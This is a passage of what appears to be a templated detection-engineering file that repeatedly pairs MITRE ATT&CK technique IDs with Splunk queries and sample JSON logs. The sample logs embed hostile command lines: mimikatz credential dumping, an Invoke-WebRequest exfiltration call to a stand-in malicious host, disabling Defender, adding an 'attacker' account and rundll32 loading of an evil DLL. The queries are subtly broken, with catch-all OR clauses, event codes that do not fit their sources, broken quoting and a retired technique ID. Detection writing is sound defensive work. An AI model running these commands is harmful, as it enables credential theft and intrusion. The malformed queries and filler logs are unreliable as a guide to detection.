  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.116",
  "DestinationPort": "445"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:15:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.137",
  "DestinationPort": "22"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:20:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.138",
  "DestinationPort": "8080"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:25:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.137",
  "DestinationPort": "3389"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:30:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.107",
  "DestinationPort": "445"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 43"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:35:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 43",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.150",
  "DestinationPort": "445"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:40:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.133",
  "DestinationPort": "80"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:45:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.108",
  "DestinationPort": "22"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:50:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.107",
  "DestinationPort": "22"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:55:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.120",
  "DestinationPort": "3389"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:00:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.148",
  "DestinationPort": "8443"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:05:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.116",
  "DestinationPort": "22"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:10:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.128",
  "DestinationPort": "445"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:15:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.144",
  "DestinationPort": "445"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:20:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.105",
  "DestinationPort": "445"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 53"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:25:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 53",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.149",
  "DestinationPort": "3389"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:30:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.143",
  "DestinationPort": "445"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:35:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.100",
  "DestinationPort": "445"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:40:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.115",
  "DestinationPort": "80"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:45:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.109",
  "DestinationPort": "445"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:50:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "22"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 18:55:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.125",
  "DestinationPort": "8080"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:00:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.137",
  "DestinationPort": "8080"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:05:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.117",
  "DestinationPort": "445"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:10:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.138",
  "DestinationPort": "8080"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 63"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:15:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 63",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.130",
  "DestinationPort": "80"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:20:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.147",
  "DestinationPort": "443"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:25:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.148",
  "DestinationPort": "80"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:30:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.131",
  "DestinationPort": "445"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:35:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.115",
  "DestinationPort": "443"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:40:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.113",
  "DestinationPort": "443"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:45:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.117",
  "DestinationPort": "443"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:50:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.119",
  "DestinationPort": "8443"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 19:55:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.140",
  "DestinationPort": "443"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:00:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.126",
  "DestinationPort": "80"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 73"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:05:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 73",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.103",
  "DestinationPort": "3389"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:10:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.124",
  "DestinationPort": "80"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:15:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.126",
  "DestinationPort": "445"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:20:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "80"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 20:25:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
